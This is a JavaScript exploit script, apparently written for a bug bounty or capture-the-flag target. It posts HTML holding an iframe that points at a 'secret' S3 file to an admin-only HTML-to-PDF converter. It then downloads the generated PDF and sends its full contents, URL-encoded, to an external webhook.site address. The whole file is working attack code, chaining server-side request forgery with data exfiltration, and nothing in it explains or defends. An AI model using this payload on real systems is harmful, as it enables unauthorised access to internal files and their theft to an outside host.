const htmlCode = "<iframe src=https://bugbase-secret-file-storage.s3.ap-northeast-2.amazonaws.com/Bugbase-full-logo-black.png width=500 height=500></iframe>"; // Set the random value to send
const xhr = new XMLHttpRequest(); // Create a new XMLHttpRequest object
xhr.open("POST", "/admin/convert"); // Set the request method and endpoint
xhr.setRequestHeader("Content-Type", "application/json"); // Set the request header
xhr.onload = function() { // Set the callback function to handle the response
  if (xhr.status === 200) { // If the response status is OK
    const response = JSON.parse(xhr.responseText); // Parse the response text as JSON
    const pdfLink = response.pdfLink; // Get the PDF link from the response
    const encpdflink = encodeURIComponent(pdfLink);
    
    // Read the contents of the PDF file
    const pdfRequest = new XMLHttpRequest(); // Create a new XMLHttpRequest object
    pdfRequest.open("GET", pdfLink); // Set the request method and endpoint
    pdfRequest.responseType = "blob"; // Set the response type to blob, since we're reading a binary file
    pdfRequest.onload = function() { // Set the callback function to handle the response
      if (pdfRequest.status === 200) { // If the response status is OK
        const blob = pdfRequest.response; // Get the blob data from the response
        const reader = new FileReader(); // Create a new FileReader object
        reader.onload = function() { // Set the callback function to handle the file read
          const pdfContent = encodeURIComponent(reader.result); // Get the URL-encoded content of the PDF file
          
          // Send the PDF content to the webhook
          const webhookUrl = `https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39?data=${encodeURIComponent(reader.result)}`;
          const webhookRequest = new XMLHttpRequest(); // Create a new XMLHttpRequest object
          webhookRequest.open("GET", webhookUrl); // Set the request method and endpoint
          webhookRequest.send(); // Send the request with no data, since the PDF content is in the URL parameter
        };
        reader.readAsDataURL(blob); // Read the blob data as a data URL
      }
    };
    pdfRequest.onerror = function() { // Set the callback function to handle errors
      console.log("Error reading PDF file."); // Log the error message
    };
    pdfRequest.send(); // Send the request to read the PDF file
  }
};
xhr.onerror = function() { // Set the callback function to handle errors
  console.log("Error sending request."); // Log the error message
};
xhr.send(JSON.stringify({ htmlCode: htmlCode })); // Send the request with the random value in JSON format
